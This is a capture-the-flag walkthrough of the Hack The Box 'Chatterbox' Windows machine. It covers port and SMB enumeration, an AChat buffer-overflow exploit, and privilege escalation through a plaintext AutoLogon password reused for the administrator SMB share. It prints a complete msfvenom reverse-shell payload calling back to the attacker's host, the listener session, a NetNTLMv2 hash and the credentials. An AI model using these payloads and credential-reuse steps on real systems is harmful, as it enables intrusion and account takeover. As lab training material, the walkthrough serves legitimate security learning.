Box: Windows
Level: Medium
### Index
1. Box Info 
2. Initial Nmap Enumeration
3. [SMB Enumeration](#SMB%20Enumeration)
4. [AChat Chat System](#AChat%20Chat%20System)
	1. [`Generating BOF using msfvenom`](#`Generating%20BOF%20using%20msfvenom`)
	2. [`Exploit Modification`](#`Exploit%20Modification`)
5. [Privilege Escalation](#Privilege%20Escalation)
	1. [`winPEASany.exe Findings`](#`winPEASany.exe%20Findings`)
### Box Info
```
Chatterbox is a fairly straightforward machine that requires basic exploit modification or Metasploit troubleshooting skills to complete.
```

### Initial Nmap Enum
```
# nmap -p- --min-rate=10000 -Pn chatterbox.htb
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
683/tcp   filtered corba-iiop
2628/tcp  filtered dict
3555/tcp  filtered razor
9255/tcp  open     mon
9256/tcp  open     unknown
19915/tcp filtered unknown
33614/tcp filtered unknown
37018/tcp filtered unknown
40000/tcp filtered safetynetp
46895/tcp filtered unknown
46935/tcp filtered unknown
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
52442/tcp filtered unknown
63026/tcp filtered unknown
Nmap done: 1 IP address (1 host up) scanned in 14.37 seconds
```

```
# nmap -p135,139,445,683,2628,3555,9255 --min-rate=10000 -sT -sC -sV -T4 -A -Pn chatterbox.htb 

PORT     STATE  SERVICE      VERSION
135/tcp  open   msrpc        Microsoft Windows RPC
139/tcp  open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
683/tcp  closed corba-iiop
2628/tcp closed dict
3555/tcp closed razor
9255/tcp open   http         AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-03T09:17:43
|_  start_date: 2024-09-03T08:50:10
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-09-03T05:17:42-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h20m00s, deviation: 2h18m35s, median: 4h59m59s

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   33.16 ms 10.10.14.1
2   35.66 ms chatterbox.htb (10.10.10.74)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds
```

```
# nmap -p135 --min-rate=1000 --script=msrpc-enum,rpc-grind,rpcap-info,rpcinfo -sC -sV -T4 -A chatterbox.htb
PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC
```

### SMB Enumeration

```
# nmap -p139,445 --min-rate=1000 --script=smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-services,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-ls,smb-mbenum,smb-os-discovery,smb-print-text,smb-protocols -sC -sV -T4 -A chatterbox.htb 

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%), Microsoft Windows Vista SP2 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-mbenum: ERROR: Script execution failed (use -d to debug)
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.74\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.74\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.74\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-09-03T05:28:59-04:00
|_smb-print-text: false
```

Notice that the `NT_STATUS_ACCESS_DENIED` for most of the shares.

### AChat Chat System

```
# nmap -p9255,9256 --min-rate=1000 -T3 -sS -sC -sV -A  10.10.10.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 01:34 EDT
Nmap scan report for chatterbox.htb (10.10.10.74)
Host is up (0.034s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat   AChat chat system
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9256/tcp)
HOP RTT      ADDRESS
1   41.87 ms 10.10.14.1
2   34.37 ms chatterbox.htb (10.10.10.74)
```

We have two ports open for the Achat System. I found this Exploit-DB [Achat 0.150 beta7 - Remote Buffer Overflow](https://www.exploit-db.com/exploits/36025). Which works like a sweet potato.
###### `Generating BOF using msfvenom`
```
# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.14.2 lport=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3822 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x39\x6c\x4b\x38\x62\x62\x59\x70"
buf += b"\x79\x70\x4d\x30\x53\x30\x42\x69\x39\x55\x4c\x71"
buf += b"\x75\x70\x70\x64\x44\x4b\x70\x50\x6c\x70\x62\x6b"
buf += b"\x71\x42\x7a\x6c\x72\x6b\x6f\x62\x5a\x74\x44\x4b"
buf += b"\x72\x52\x4b\x78\x6a\x6f\x37\x47\x4e\x6a\x6d\x56"
buf += b"\x4d\x61\x59\x6f\x66\x4c\x4d\x6c\x4f\x71\x53\x4c"
buf += b"\x4b\x52\x4c\x6c\x6d\x50\x47\x51\x46\x6f\x6a\x6d"
buf += b"\x6b\x51\x65\x77\x58\x62\x58\x72\x42\x32\x4e\x77"
buf += b"\x34\x4b\x62\x32\x6c\x50\x52\x6b\x4d\x7a\x6f\x4c"
buf += b"\x62\x6b\x6e\x6c\x6e\x31\x51\x68\x79\x53\x61\x38"
buf += b"\x59\x71\x58\x51\x50\x51\x64\x4b\x31\x49\x4f\x30"
buf += b"\x4b\x51\x79\x43\x52\x6b\x50\x49\x4c\x58\x38\x63"
buf += b"\x6e\x5a\x31\x39\x32\x6b\x30\x34\x32\x6b\x69\x71"
buf += b"\x66\x76\x4c\x71\x6b\x4f\x56\x4c\x37\x51\x66\x6f"
buf += b"\x4a\x6d\x6d\x31\x68\x47\x6d\x68\x57\x70\x73\x45"
buf += b"\x69\x66\x6c\x43\x33\x4d\x79\x68\x4f\x4b\x73\x4d"
buf += b"\x6f\x34\x33\x45\x59\x54\x70\x58\x42\x6b\x42\x38"
buf += b"\x4c\x64\x49\x71\x69\x43\x61\x56\x54\x4b\x7a\x6c"
buf += b"\x6e\x6b\x54\x4b\x42\x38\x4b\x6c\x59\x71\x6a\x33"
buf += b"\x64\x4b\x4a\x64\x42\x6b\x6a\x61\x68\x50\x44\x49"
buf += b"\x71\x34\x4f\x34\x6c\x64\x51\x4b\x51\x4b\x73\x31"
buf += b"\x6f\x69\x51\x4a\x4f\x61\x39\x6f\x47\x70\x31\x4f"
buf += b"\x4f\x6f\x70\x5a\x52\x6b\x4a\x72\x5a\x4b\x74\x4d"
buf += b"\x6f\x6d\x53\x38\x70\x33\x70\x32\x4d\x30\x59\x70"
buf += b"\x4f\x78\x54\x37\x42\x53\x30\x32\x61\x4f\x51\x44"
buf += b"\x72\x48\x70\x4c\x62\x57\x6b\x76\x5a\x67\x69\x6f"
buf += b"\x67\x65\x66\x58\x36\x30\x79\x71\x6d\x30\x6d\x30"
buf += b"\x4f\x39\x39\x34\x71\x44\x52\x30\x73\x38\x4c\x69"
buf += b"\x43\x50\x50\x6b\x39\x70\x79\x6f\x7a\x35\x42\x30"
buf += b"\x6e\x70\x52\x30\x30\x50\x4f\x50\x52\x30\x6d\x70"
buf += b"\x62\x30\x63\x38\x48\x6a\x6c\x4f\x57\x6f\x6b\x30"
buf += b"\x6b\x4f\x56\x75\x46\x37\x51\x5a\x7a\x65\x52\x48"
buf += b"\x4b\x5a\x39\x7a\x6a\x6e\x4a\x62\x42\x48\x59\x72"
buf += b"\x69\x70\x4c\x51\x4f\x6c\x62\x69\x49\x56\x6f\x7a"
buf += b"\x4c\x50\x50\x56\x72\x37\x72\x48\x42\x79\x67\x35"
buf += b"\x53\x44\x51\x51\x6b\x4f\x46\x75\x65\x35\x47\x50"
buf += b"\x54\x34\x6c\x4c\x6b\x4f\x30\x4e\x79\x78\x43\x45"
buf += b"\x68\x6c\x52\x48\x7a\x50\x68\x35\x36\x42\x70\x56"
buf += b"\x4b\x4f\x79\x45\x70\x68\x51\x53\x30\x6d\x53\x34"
buf += b"\x79\x70\x53\x59\x49\x53\x31\x47\x52\x37\x4e\x77"
buf += b"\x50\x31\x58\x76\x52\x4a\x6e\x32\x52\x39\x32\x36"
buf += b"\x67\x72\x6b\x4d\x53\x36\x79\x37\x71\x34\x4e\x44"
buf += b"\x6d\x6c\x49\x71\x4d\x31\x32\x6d\x70\x44\x4b\x74"
buf += b"\x6e\x30\x56\x66\x49\x70\x4e\x64\x31\x44\x6e\x70"
buf += b"\x51\x46\x4f\x66\x52\x36\x4f\x56\x71\x46\x30\x4e"
buf += b"\x71\x46\x70\x56\x31\x43\x51\x46\x62\x48\x50\x79"
buf += b"\x58\x4c\x6d\x6f\x31\x76\x79\x6f\x68\x55\x33\x59"
buf += b"\x39\x50\x4e\x6e\x42\x36\x30\x46\x39\x6f\x6e\x50"
buf += b"\x61\x58\x5a\x68\x55\x37\x6b\x6d\x63\x30\x79\x6f"
buf += b"\x6a\x35\x55\x6b\x6a\x50\x56\x55\x45\x52\x61\x46"
buf += b"\x72\x48\x45\x56\x33\x65\x45\x6d\x43\x6d\x4b\x4f"
buf += b"\x46\x75\x4f\x4c\x6d\x36\x33\x4c\x5a\x6a\x51\x70"
buf += b"\x59\x6b\x37\x70\x50\x75\x39\x75\x75\x6b\x51\x37"
buf += b"\x4b\x63\x62\x52\x32\x4f\x72\x4a\x6d\x30\x42\x33"
buf += b"\x69\x6f\x7a\x35\x41\x41"
```

Start the NetCat Listener and modify the final exploit as follow.
###### `Exploit Modification`
```
Replace the BOF buf = "" up until the end.
server_address = ('10.10.10.74', 9256)
```

`NetCat Listener getting Shell`
```
# nc -lvnp 4444                                  
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.74] 49174
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Users\Alfred\Desktop>type user.txt
type user.txt
22e9e5e776307f238c22884603447e78
```

Get the user flag.
### Privilege Escalation
###### `winPEASany.exe Findings`
```
############ Basic System Information
    OS Name: Microsoft Windows 7 Professional
    OS Version: 6.1.7601 Service Pack 1 Build 7601
    
############ User Environment Variables
PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
TEMP: C:\Users\Alfred\AppData\Local\Temp

############ Enumerate LSA settings - auth packages included
Security Packages                    :       kerberos,msv1_0,schannel,wdigest,tspkg,pku2u
[!]      WDigest is enabled - plaintext password extraction is possible!

############ Installed .NET versions
  CLR Versions
   2.0.50727
   4.0.30319
   
  .NET Versions      
   3.5.30729.5420
   4.7.02053

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : False
      OS supports AMSI               : False

############ Current Token privileges
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED

############ Modifiable Services
# Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    wcncsvc: GenericExecute (Start/Stop)

############ Looking if you can modify any service registry
# Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\Dnscache (Interactive [CreateSubKey], Users [CreateSubKey])
    HKLM\system\currentcontrolset\services\RpcEptMapper (Authenticated Users [CreateSubKey], Users [CreateSubKey])

############ Autorun Applications
Folder: C:\
    FolderPerms: Authenticated Users [AppendData/CreateDirectories]
    File: C:\autoexec.bat

############ Scheduled Applications --Non Microsoft--
# Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (CHATTERBOX\Alfred) Reset AChat service: "C:\Users\Alfred\AppData\Local\Microsoft\Windows Media\reset.bat" 
    Permissions file: Alfred [AllAccess]
    Permissions folder(DLL Hijacking): Alfred [AllAccess]

############ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    Alfred::CHATTERBOX:1122334455667788:fb4d400c96128fe94d361d3b36d5b98f:0101000000000000f11a058cebfdda014c2c3dce36f4d0b1000000000800300030000000000000000000000000200000d812d7a704b13e3c5e938b97595933b871eac6bdc37673f6e0284295c6b398720a00100000000000000000000000000000000000090000000000000000000000 

############ Ever logged users
    CHATTERBOX\Administrator
    CHATTERBOX\Alfred

############ Home folders found
    C:\Users\Administrator : Alfred [AllAccess]
    C:\Users\Alfred : Alfred [AllAccess]
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [WriteData/CreateFiles]

############ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1!
```

We have found the AutoLogon Credentials for the `Alfred` User.  Let's try out this credentials to get `Evil-Winrm` or `smb` shell
```
# evil-winrm -i 10.10.10.74 -u 'alfred' -p 'Welcome1!'
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "10.10.10.74" port 5985 (10.10.10.74:5985)                                        
Error: Exiting with code 1

```

Hmm.....Trying out smbclient with this credentials and access C$
```
# smbclient -U 'alfred%Welcome1!' \\\\10.10.10.74\\C$
tree connect failed: NT_STATUS_ACCESS_DENIED

# smbclient -U 'alfred%Welcome1!' \\\\10.10.10.74\\ADMIN$
tree connect failed: NT_STATUS_ACCESS_DENIED

# smbclient -U 'alfred%Welcome1!' \\\\10.10.10.74\\IPC$  
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_INVALID_PARAMETER listing \*
smb: \> exit
```

Let's try to just change the username from `alfred` to `administrator`. 
```
# smbclient -U 'administrator%Welcome1!' \\\\10.10.10.74\\C$    
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Sun Dec 10 09:21:46 2017
  autoexec.bat                        A       24  Wed Jun 10 17:42:20 2009
  Boot                              DHS        0  Sun Dec 10 12:03:24 2017
  bootmgr                          AHSR   399860  Wed Mar 23 18:39:31 2016
  BOOTSECT.BAK                     AHSR     8192  Sun Dec 10 12:15:21 2017
  config.sys                          A       10  Wed Jun 10 17:42:20 2009
  Documents and Settings          DHSrn        0  Tue Jul 14 00:53:55 2009
  pagefile.sys                      AHS 2146951168  Tue Sep  3 06:31:45 2024
  PerfLogs                            D        0  Mon Jul 13 22:37:05 2009
  Program Files                      DR        0  Sun Mar  6 23:31:53 2022
  ProgramData                       DHn        0  Sun Mar  6 23:28:26 2022
  Recovery                         DHSn        0  Sun Dec 10 09:18:18 2017
  System Volume Information         DHS        0  Tue Sep  3 06:56:21 2024
  tmp                                 D        0  Tue Sep  3 06:53:47 2024
  Users                              DR        0  Sun Dec 10 09:21:44 2017
  Windows                             D        0  Tue Sep  3 06:56:48 2024

                3931903 blocks of size 4096. 817478 blocks available
smb: \> cd USers
smb: \USers\> dir
  .                                  DR        0  Sun Dec 10 09:21:44 2017
  ..                                 DR        0  Sun Dec 10 09:21:44 2017
  Administrator                       D        0  Sun Dec 10 13:34:46 2017
  Alfred                              D        0  Sun Dec 10 09:18:32 2017
  All Users                       DHSrn        0  Tue Jul 14 00:53:55 2009
  Default                           DHR        0  Tue Jul 14 03:17:20 2009
  Default User                    DHSrn        0  Tue Jul 14 00:53:55 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:41:57 2009
  Public                             DR        0  Mon Apr 11 22:21:11 2011

                3931903 blocks of size 4096. 817478 blocks available
smb: \USers\> cd Administrator
smb: \USers\Administrator\> cd Desktop
smb: \USers\Administrator\Desktop\> dir
  .                                  DR        0  Sun Dec 10 18:50:42 2017
  ..                                 DR        0  Sun Dec 10 18:50:42 2017
  desktop.ini                       AHS      282  Sun Dec 10 18:08:47 2017
  root.txt                           AR       34  Tue Sep  3 06:32:24 2024

                3931903 blocks of size 4096. 817478 blocks available
smb: \USers\Administrator\Desktop\> type root.txt
type: command not found
smb: \USers\Administrator\Desktop\> get root.txt
getting file \USers\Administrator\Desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \USers\Administrator\Desktop\> exit
                                                                                                                                                                        
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Chatterbox.htb]
└─# cat root.txt                   
7f1b5ed61adeea9315c8b00820e42fca
```

Get your Root Flag!.